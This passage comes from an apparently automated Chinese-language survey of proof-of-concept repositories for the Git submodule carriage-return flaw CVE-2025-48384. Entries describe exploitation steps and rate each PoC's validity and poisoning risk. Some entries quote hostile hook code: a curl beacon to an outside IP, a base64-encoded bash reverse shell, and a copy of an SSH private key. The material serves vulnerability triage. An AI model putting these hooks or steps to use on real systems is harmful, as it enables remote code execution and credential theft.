CVE-2025-48384 漏洞允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。该漏洞源于 Git 在处理配置文件时，没有正确处理尾部的回车符（CR）。攻击者可以利用这一点，在子模块路径中添加尾部回车符，导致 Git 将子模块检出到错误的位置。如果攻击者在该位置放置一个符号链接，指向子模块的钩子目录，并子模块包含一个可执行的 `post-checkout` 钩子，那么在检出后，该钩子脚本就会被执行，从而实现远程代码执行。

**有效性：** 根据漏洞描述和提供的漏洞利用代码（`post-checkout` 脚本），可以判断该 POC 代码有效。脚本尝试从攻击者的服务器下载并执行代码。

**投毒风险：** 提供的 `post-checkout` 脚本本身就是漏洞利用的一部分，目的是执行恶意代码。如果该脚本是从攻击者控制的仓库中获取的，那么它自然会执行攻击者想要执行的操作。因此，从这个角度来说，可以说利用本身具有“投毒”性质。更准确地说，这不是传统的供应链投毒，而是漏洞利用的核心部分。脚本的功能是将受害者机器的信息发送到攻击者的服务器（ `curl http://120.46.135.127:50009?z`），因此本身不包含额外的、隐藏的恶意行为。该脚本本身就是后门，旨在执行任意命令。

**利用方式：**
1.  攻击者创建一个包含恶意配置的 Git 仓库，该配置在子模块路径中包含尾部回车符。
2.  攻击者在恶意仓库中设置一个符号链接，将修改后的子模块路径指向 Git 钩子目录。
3.  攻击者在子模块中包含一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该恶意仓库并执行 `git submodule update --init --recursive` 命令。
5.  Git 将子模块检出到错误的位置，符号链接生效，`post-checkout` 钩子脚本被执行，从而实现远程代码执行。

**风险评估：** 此漏洞风险极高，因为攻击者可以通过诱导用户克隆恶意仓库，在用户机器上执行任意代码。

**项目地址:** [altm4n/cve-2025-48384-hub](https://github.com/altm4n/cve-2025-48384-hub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #9

**来源**: [CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md](../2025/CVE-2025-48384-beishanxueyuan_CVE-2025-48384.md)

## CVE-2025-48384 - Git Config 注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库，并初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 对配置项中回车符（CR）处理不当。具体来说，当 Git 读取配置值时，会去除尾部的 CRLF。但当写入配置项时，如果值包含尾部 CR，则不会被引用，导致 CR 在后续读取时丢失。这个漏洞可以被利用于子模块初始化过程中。如果子模块的路径包含尾部 CR，修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将修改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，那么在检出后，该脚本可能会被意外执行，从而导致任意代码执行。

**POC 分析：**

提供的 POC 包含以下文件：

*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/README.md`：一个普通的 README 文件，可能用于描述 PoC 的用途。
*   `/tmp/c0992c92d79d1fe84e0bde5daf2c172b/post-checkout`：一个 bash 脚本，当子模块检出后会被执行。脚本的功能很简单，就是创建一个 `/tmp/fishsucks` 文件。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件中的子模块路径包含尾部 CR。
2.  攻击者在该仓库中创建一个子模块，并在该子模块的 `.git/hooks` 目录下放置一个名为 `post-checkout` 的可执行脚本（如提供的POC）。
3.  攻击者创建一个符号链接，将包含尾部 CR 的子模块路径指向该子模块的 `.git/hooks` 目录。
4.  受害者克隆该仓库，并执行 `git submodule init` 和 `git submodule update` 命令。
5.  由于 Git 对尾部 CR 的处理不当，子模块会被检出到错误的位置，并且 `post-checkout` 脚本会被执行，从而导致任意代码执行。

**有效性：**

根据漏洞描述和 POC 代码，该 POC 是有效的。它可以利用 Git 的配置解析漏洞，在受害者机器上执行任意代码。

**投毒风险：**

该POC的目的是创建一个`/tmp/fishsucks`文件,根据POC内容来看，此代码的目的是演示该漏洞，没有发现隐藏的恶意代码，因此投毒风险较低，可以认为是 0%。

**项目地址:** [beishanxueyuan/CVE-2025-48384](https://github.com/beishanxueyuan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #10

**来源**: [CVE-2025-48384-bummie_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-bummie_CVE-2025-48384-submodule.md)

## CVE-2025-48384-git-代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的仓库或初始化包含恶意配置的子模块，且git版本在受影响范围内。用户需要进行交互。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384漏洞是由于Git在处理配置文件时，对换行符(
)处理不当造成的。当Git读取配置值时，会删除任何尾部的回车换行符(CRLF)。当写入配置条目时，带有尾部CR的值不会被引用，导致稍后读取配置时CR丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，该符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则该脚本可能会在检出后被意外执行。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`配置文件的仓库，该文件中的子模块路径包含尾部CR字符。
2.  攻击者创建一个符号链接，将修改后的路径（由于CR被移除）指向`.git/modules/<submodule_name>/hooks` 目录。
3.  攻击者在子模块中添加一个恶意的`post-checkout` 钩子，该钩子包含要执行的恶意代码。
4.  受害者克隆恶意仓库并初始化子模块。
5.  当子模块被检出时，由于符号链接的存在，恶意的`post-checkout` 钩子会被执行，导致任意代码执行。

**POC分析：**

提供的POC包含以下文件：

*   `README.md`：指向 GitHub 上的漏洞信息。
*   `post-checkout`：包含恶意代码的钩子脚本。

`post-checkout`脚本内容分析：

```bash
echo "yeet" > /tmp/pwn.txt
printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTI4LjUuMzkvNDQ0NCAwPiYxKSAm|base64 -d|bash
```

*   该脚本首先创建一个文件`/tmp/pwn.txt`，内容为"yeet"，作为漏洞成功利用的标识。
*   然后，它使用`base64 -d`解码一段base64编码的字符串，并通过`bash`执行解码后的字符串。这段字符串实际上是一个反向shell连接到`10.128.5.39:4444`。

**有效性：**

提供的POC代码是有效的，如果目标机器满足漏洞利用的条件，则可以成功执行任意代码。

**投毒风险：**

提供的代码本身就是漏洞利用代码，旨在建立反向shell。虽然它本身不是隐藏的投毒代码，但如果用户不理解代码的含义就执行，那么对于用户来说，这就是恶意的。由于该代码已经明确展示了其恶意行为(反向shell)，因此**投毒风险为0%**。


**项目地址:** [bummie/CVE-2025-48384-submodule](https://github.com/bummie/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #11

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC-Part2.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户执行递归克隆包含恶意.gitmodules文件的不受信任的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，允许攻击者通过构造恶意的.gitmodules文件和post-checkout钩子执行任意代码。该漏洞源于Git在处理带有回车符的配置值时存在差异，导致 submodule 被检出到错误的位置。如果攻击者在 submodule hooks 目录中放置一个符号链接，指向一个包含可执行的 post-checkout 钩子的子模块，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 post-checkout 钩子，它会在 `/tmp/exploited` 目录下创建一个文件。如果目标系统存在此漏洞并且成功利用，那么这个文件将被创建，表明漏洞利用成功。因此，该POC代码对于验证漏洞的存在是有效的。

**投毒风险：**

提供的POC代码本身非常简单，只是创建了一个文件。没有迹象表明代码中存在隐藏的恶意功能，因此投毒风险为0%。但是，这并不意味着包含此POC的仓库没有投毒风险。攻击者可能会在仓库的其他部分添加恶意代码，或者修改其他钩子来执行恶意操作。

**利用方式：**

漏洞利用方式如下：

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库。该文件包含带有尾随回车符的submodule路径。
2.  攻击者在submodule hooks目录中创建一个符号链接，将更改后的路径指向包含恶意 post-checkout 钩子的子模块。
3.  攻击者诱使用户递归克隆该仓库 (`git clone --recursive <repository_url>`)。
4.  当 Git 初始化 submodule 时，由于回车符处理不一致，submodule 会被检出到错误的位置。
5.  由于符号链接的存在，恶意的 post-checkout 钩子会被执行，导致任意代码执行。

总而言之，这是一个客户端漏洞，需要用户执行特定的操作才能被利用。攻击者需要诱使用户克隆包含恶意配置的仓库，并且用户需要使用受影响的 Git 版本。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC-Part2](https://github.com/butyraldehyde/CVE-2025-48384-PoC-Part2)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #12

**来源**: [CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md](../2025/CVE-2025-48384-butyraldehyde_CVE-2025-48384-PoC.md)

## CVE-2025-48384-Git配置注入导致RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/RCE

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要clone包含恶意配置的git仓库（特别是包含submodule的仓库），并递归更新submodule。需要用户交互。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞是由于 Git 在处理包含回车符（CR）的配置值时存在不一致的行为导致的。具体来说，Git在读取配置值时会移除尾部的CRLF，但在写入配置时，如果值以CR结尾，则不会进行引号包裹，这会导致在后续读取时CR被截断。利用此漏洞，攻击者可以通过构造包含恶意配置的 `.gitmodules` 文件，当用户递归克隆包含 submodule 的仓库时，submodule会被检出到错误的位置。如果错误的位置存在一个指向 submodule 钩子目录的符号链接，并且 submodule 中包含一个可执行的 post-checkout 钩子，那么该钩子脚本可能在检出后被意外执行，从而导致远程代码执行 (RCE)。

**有效性：** 提供的 POC 代码 `/tmp/81eebc7f5ed9915ea7ef755075778acd/README.md` 看起来只是一个 README 文件，用于描述该漏洞。单凭这个文件本身无法直接触发漏洞，但可以作为漏洞利用的一部分，例如提供一个包含恶意`.gitmodules`文件的仓库。因此，提供的 PoC 代码本身无效，需要配合其他恶意文件才能完成漏洞利用。

**投毒风险：** 虽然提供的 PoC 仅仅是一个 README 文件，没有任何可疑代码。但是考虑到攻击者可能会在整个恶意Git仓库的其他位置，比如 `.gitmodules` 文件，或者 submodule 的 post-checkout 钩子中隐藏恶意代码。 考虑到这个漏洞需要恶意git仓库才能触发，因此存在一定的投毒风险，风险占比10%。

**利用方式：**

1.  **创建恶意 Git 仓库：** 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2.  **注入恶意配置：** 在 `.gitmodules` 文件中，攻击者设置 submodule 的路径，并在路径末尾包含一个回车符（CR）。此路径会被 Git 处理错误，导致 submodule 被检出到非预期的位置。
3.  **创建符号链接：** 攻击者在仓库中创建一个符号链接，将错误的 submodule 路径指向 `.git/modules/<submodule>/hooks` 目录。
4.  **添加恶意钩子：** 攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户克隆：** 攻击者诱骗用户递归克隆（`git clone --recursive`）恶意仓库。
6.  **触发 RCE：** 当用户执行 `git submodule update --init --recursive` 命令或类似的命令初始化 submodule 时，由于配置处理错误和符号链接的存在，恶意 post-checkout 钩子脚本会被执行，从而导致 RCE。

**项目地址:** [butyraldehyde/CVE-2025-48384-PoC](https://github.com/butyraldehyde/CVE-2025-48384-PoC)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #13

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-main.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-main.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致服务器被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库或初始化包含恶意配置的子模块），且Git版本在受影响范围内

**POC 可用性:** 是，但提供的POC不完整

**投毒风险:** 10%

## 详情

该漏洞源于Git处理配置中的引号不当，特别是在子模块初始化时。攻击者可以构造包含恶意配置的Git仓库，该配置在子模块路径中包含尾随的回车符（CR）。当Git读取这个配置时，会错误地解析子模块路径，导致子模块被检出到错误的位置。如果存在一个指向子模块钩子目录的符号链接，并且该子模块包含一个可执行的 post-checkout 钩子，那么该钩子可能会在检出后被意外执行，从而导致任意代码执行。

**有效性分析：**
提供的POC代码 `/tmp/bf064e338662304d3b4aa41ca61a0b1a/README.md`  只包含一个简单的markdown文件，无法直接证明漏洞的有效性。 它只是一个 README 文件，用来描述或者记录一些信息,不能用来验证漏洞的有效性。缺少必要的利用步骤，例如：构造恶意仓库，包含特殊字符的子模块路径，和可执行的 post-checkout 钩子。

**投毒风险分析：**
提供的POC代码只包含一个README文件，投毒风险较低，但也不能完全排除作者在其他文件或分支中隐藏恶意代码的可能性。假设该作者还有其他的commit/branch，有投毒的可能性，所以投毒风险评估为10%。

**利用方式：**
1.  攻击者创建一个包含恶意配置的Git仓库。
2.  恶意配置的核心是子模块路径，其中包含一个尾随的回车符（CR）。
3.  攻击者创建一个符号链接，将错误的子模块路径指向子模块的钩子目录（.git/hooks）。
4.  恶意仓库包含一个子模块，其中包含一个可执行的 post-checkout 钩子脚本。
5.  受害者克隆恶意仓库或初始化包含恶意配置的子模块。
6.  Git解析错误路径，将子模块检出到错误位置，并触发符号链接。
7.  post-checkout 钩子脚本被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-main](https://github.com/ceevase/CVE-2025-48384-main)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #14

**来源**: [CVE-2025-48384-ceevase_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-ceevase_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 < 2.44.4, >= 2.45.0-rc0 < 2.45.4, >= 2.46.0-rc0 < 2.46.4, >= 2.47.0-rc0 < 2.47.3, >= 2.48.0-rc0 < 2.48.2, >= 2.49.0-rc0 < 2.49.1, >= 2.50.0-rc0 < 2.50.1

**利用条件:** 需要用户检出包含恶意配置的Git仓库，且目标Git版本存在漏洞

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞源于Git在处理配置文件时的不当引用。攻击者可以通过在 submodule 的路径中注入回车符（CR），导致 Git 将 submodule 检出到错误的位置。如果攻击者精心构造一个符号链接，将这个错误的位置指向 `.git/hooks` 目录，并且 submodule 中包含一个可执行的 `post-checkout` 钩子，那么在检出 submodule 后，这个钩子就会被执行，从而实现任意代码执行。

**POC有效性：** 提供的POC代码包含一个 `post-checkout` 钩子脚本，该脚本会将 `/home/gamma/.ssh/id_ed25519` 的内容复制到 `/tmp/recipes.txt`。这个脚本本身可以成功运行，并达到预期的效果，因此POC有效。

**投毒风险：** 从提供的POC代码来看，没有发现明显的恶意投毒行为。该POC主要演示了漏洞的利用方式，即通过执行 `post-checkout` 钩子来窃取SSH私钥。因此，投毒风险评估为0%。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该仓库中的 submodule 路径包含一个尾随回车符。
2.  攻击者创建一个符号链接，将错误的 submodule 检出位置指向 `.git/hooks` 目录。
3.  攻击者在 submodule 中添加一个可执行的 `post-checkout` 钩子，该钩子包含恶意代码。
4.  攻击者诱骗受害者检出该Git仓库。
5.  受害者检出 submodule 时，由于配置解析错误，submodule 会被检出到错误的位置，从而触发符号链接，使得 `.git/hooks/post-checkout` 钩子被执行。
6.  恶意代码被执行，导致任意代码执行。

**项目地址:** [ceevase/CVE-2025-48384-sub](https://github.com/ceevase/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #15

**来源**: [CVE-2025-48384-eliox01_CVE-2025-48384.md](../2025/CVE-2025-48384-eliox01_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，允许攻击者通过构造特殊的 Git 配置文件，在受害者克隆或初始化子模块时执行任意代码。漏洞的根源在于 Git 对配置项中尾部回车符（CR）处理不当。当 Git 读取配置值时，会删除尾部的 CRLF，但写入时，如果值以 CR 结尾，则不会进行引号处理，导致 CR 在后续读取时丢失。如果子模块路径包含尾部 CR，这会导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，那么在检出后可能会意外执行该脚本。

**有效性：**

提供的 POC 代码 `/tmp/4ddcea7dd1399c323a9fb7a8b3071e04/README.md` 本身并不能直接验证漏洞，它只是一个简单的说明文件。真正的 POC 应该包含能够触发漏洞的恶意 Git 仓库配置和子模块结构。从搜索结果来看，存在可用的 POC。

**投毒风险：**

提供的 README.md 文件本身不包含任何可执行代码，因此直接的投毒风险较低。但是，如果该仓库中存在其他文件（例如恶意的 `.gitmodules` 文件或者钩子脚本），则存在投毒的风险。假设仓库作者在其他文件中隐藏了恶意代码的可能性存在，估计投毒风险为 10%。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含特殊构造的 `.gitmodules` 文件和恶意的子模块钩子脚本的 Git 仓库。
2.  **.gitmodules 构造：**  `.gitmodules` 文件中的子模块路径包含尾部回车符（CR），例如 `path = submodule_path\r`。
3.  **符号链接：** 创建一个符号链接，将 `submodule_path` 指向 `.git/modules/<submodule_name>/hooks`。
4.  **恶意钩子：** 子模块中包含一个 `post-checkout` 钩子脚本，该脚本包含恶意代码。
5.  **诱骗用户：** 攻击者诱骗受害者克隆该恶意仓库并初始化子模块（使用 `git clone --recurse-submodules` 或 `git submodule update --init --recursive`）。
6.  **触发漏洞：** 当 Git 初始化子模块时，由于路径中的回车符被错误处理，子模块会被检出到错误的位置。由于存在符号链接，`post-checkout` 钩子会被执行，从而导致任意代码执行。

**项目地址:** [eliox01/CVE-2025-48384](https://github.com/eliox01/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #16

**来源**: [CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md](../2025/CVE-2025-48384-elprogramadorgt_CVE-2025-48384.md)

## CVE-2025-48384-Git配置注入与任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统被控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户clone包含恶意配置的Git仓库或者提交包含恶意配置的patch

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，没有正确处理回车符 \r，导致在特定情况下（如初始化包含子模块的仓库时），子模块路径被错误解析。攻击者可以利用这一点，通过在子模块路径中注入恶意字符，配合精心构造的符号链接，将子模块检出到非预期位置，例如 Git 钩子目录。如果子模块包含恶意的 post-checkout 钩子脚本，则在检出后会被执行，从而实现任意代码执行。

**有效性评估：**
根据漏洞信息和搜索结果，此漏洞的利用需要满足一定条件，即需要用户 clone 包含恶意子模块配置的仓库或者提交包含恶意配置的patch。提供的 POC 代码 `/tmp/8746716955bead91920f029f2728e38d/README.md` 仅仅是一个 README 文件，本身不具备任何攻击性，因此不能直接作为有效的 POC。

**投毒风险评估：**
提供的 POC 代码只是一个简单的 README 文件，没有任何可执行代码，因此不存在直接的投毒风险。投毒行为可能存在于更复杂的攻击场景中，比如在精心构造的恶意 Git 仓库中，但仅凭这个 README 文件无法评估其风险。

**利用方式：**
1.  攻击者创建一个包含恶意子模块配置的 Git 仓库，子模块的路径包含回车符 \r。
2.  攻击者创建一个符号链接，将修改后的子模块路径指向 Git 钩子目录（.git/hooks）。
3.  攻击者在子模块中包含一个恶意的 post-checkout 钩子脚本。
4.  受害者 clone 该恶意仓库，Git 初始化子模块时，由于回车符处理不当，子模块被检出到错误的钩子目录。
5.  检出完成后，恶意的 post-checkout 钩子脚本被执行，攻击者从而实现任意代码执行。

**项目地址:** [elprogramadorgt/CVE-2025-48384](https://github.com/elprogramadorgt/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #17

**来源**: [CVE-2025-48384-fishyyh_CVE-2025-48384.md](../2025/CVE-2025-48384-fishyyh_CVE-2025-48384.md)

## CVE-2025-48384 Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块。用户需要使用受影响的Git版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

